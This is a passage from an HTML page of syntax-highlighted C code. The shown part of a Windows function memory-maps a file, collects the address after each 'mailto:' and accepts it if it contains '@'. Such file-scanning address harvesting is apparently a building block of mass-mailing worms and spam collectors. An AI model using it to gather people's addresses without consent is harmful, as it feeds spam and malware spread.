        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strncmpi</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">,</span><span class="sc11">mapped</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">34</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">39</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">127</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span></div></body>
</html>
